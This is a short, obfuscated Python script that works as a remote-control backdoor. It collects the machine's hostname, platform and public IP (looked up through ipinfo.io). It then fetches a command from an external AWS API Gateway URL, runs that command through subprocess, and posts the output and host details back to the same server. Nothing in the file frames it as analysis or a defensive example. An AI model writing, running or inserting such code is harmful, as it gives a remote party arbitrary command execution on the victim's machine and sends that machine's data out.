import requests
U=requests.post
V=requests.get
import platform
H=platform.platform
import subprocess
x=subprocess.getoutput
import socket
e=socket.gethostname
G="https://zkkpj4z2xc.execute-api.ca-central-1.amazonaws.com/dev"
def Y():
 r=V('http://ipinfo.io/ip')
 return r.text.rstrip('\n')
def M(G):
 r=V(G+'/q')
 return r.json()['command']
def C(G,c,f,ip,O):
 h=G+'/a'
 r=U(h,json={"hostname":c,"ip":ip,"response":O,"platform":f})
def F(s):
 return x(s)
c=e()
f=H()
s=M(G)
ip=Y()
O=F(s)
C(G,c,f,ip,O)


